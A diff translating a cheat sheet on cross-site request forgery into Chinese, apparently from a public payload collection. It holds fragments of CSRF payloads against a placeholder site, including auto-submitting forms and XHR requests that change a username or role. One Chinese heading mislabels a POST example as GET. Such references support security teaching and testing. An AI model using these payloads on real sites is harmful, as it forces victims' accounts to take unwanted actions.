@@ -1,19 +1,19 @@
-# Cross-Site Request Forgery
+# 跨站请求伪造
 
-> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
+> 跨站请求伪造 (CSRF/XSRF) 是一种攻击可以使最终用户在当前已经通过身份验证的Web应用程序上执行不需要的操作. CSRF 攻击主要是针对更改状态的请求而不是去窃取数据, 攻击者无法看到攻击后的响应. - OWASP
 
 
 ## Summary
 
 * [Methodology](#methodology)
 * [Payloads](#payloads)
-    * [HTML GET - Requiring User Interaction](#)
-    * [HTML GET - No User Interaction)](#)
-    * [HTML POST - Requiring User Interaction](#)
-    * [HTML POST - AutoSubmit - No User Interaction](#)
-    * [JSON GET - Simple Request](#)
-    * [JSON POST - Simple Request](#)
-    * [JSON POST - Complex Request](#)
+	* [HTML GET - Requiring User Interaction](#)
+	* [HTML GET - No User Interaction)](#)
+	* [HTML POST - Requiring User Interaction](#)
+	* [HTML POST - AutoSubmit - No User Interaction](#)
+	* [JSON GET - Simple Request](#)
+	* [JSON POST - Simple Request](#)
+	* [JSON POST - Complex Request](#)
 
 ## Tools
 
@@ -21,13 +21,15 @@
 
 ## Methodology
 
-![CSRF_cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true)
+![CSRF_cheatsheet](./images/CSRF-CheatSheet.png)
 
 ## Payloads
 
-When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.
+当你登陆到某个站点时，通常会有一个会话。该会话的标识符存储在浏览器的cookie里面，并且随每个请求一起发送到该站点。 即使其他站点触发了请求，该cookie也会与该请求一起发送，并且该请求的处理方式就像已登录的用户执行了该请求一样。
 
 ### HTML GET - Requiring User Interaction
+
+GET请求需要用户交互
 
 ```html
 <a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
@@ -35,11 +37,15 @@ When you are logged in to a certain site, you typically have a session. The iden
 
 ### HTML GET - No User Interaction
 
+GET请求不需要用户交互
+
 ```html
 <img src="http://www.example.com/api/setusername?username=CSRFd">
 ```
 
 ### HTML POST - Requiring User Interaction
+
+POST请求需要用户交互
 
 ```html
 <form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
@@ -49,6 +55,8 @@ When you are logged in to a certain site, you typically have a session. The iden
 ```
 
 ### HTML POST - AutoSubmit - No User Interaction
+
+POST请求 - 自动提交 - 不需要用户交互
 
 ```html
 <form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
@@ -61,8 +69,9 @@ When you are logged in to a certain site, you typically have a session. The iden
 </script>
 ```
 
-
 ### JSON GET - Simple Request
+
+JSON GET请求 简单的请求
 
 ```html
 <script>
@@ -73,6 +82,8 @@ xhr.send();
 ```
 
 ### JSON POST - Simple Request
+
+JSON POST请求 简单的请求
 
 ```html
 <script>
@@ -88,6 +99,8 @@ xhr.send('{"role":admin}');
 ```
 
 ### JSON POST - Complex Request
+
+JSON GET请求 复杂的请求
 
 ```html
 <script>
